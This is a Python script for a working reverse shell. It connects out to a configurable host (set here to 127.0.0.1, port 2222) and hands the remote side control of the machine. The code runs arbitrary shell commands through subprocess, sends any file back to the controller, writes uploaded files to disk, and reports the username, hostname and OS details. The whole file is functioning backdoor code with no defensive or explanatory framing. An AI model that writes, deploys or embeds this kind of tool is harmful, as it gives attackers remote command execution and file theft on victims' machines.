import getpass
import os
import platform
import socket
import subprocess
import colorama
from colorama import Fore, Style

colorama.init()

RHOST = "127.0.0.1"
RPORT = 2222

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # List files in the dir
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())

        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sock.send(b"DONE")
            print("Finished sending data")

        elif cmd.split(" ")[0] == "upload":
            file_name = cmd.split(" ")[1]
            with open(file_name, "wb") as f:
                read_data = sock.recv(1024)
                while read_data:
                    f.write(read_data)
                    read_data = sock.recv(1024)
                    if read_data == b"DONE":
                        break

        # Terminate the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # Run any other command
        elif not cmd:
            print("Connection dropped")
            break

        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close()
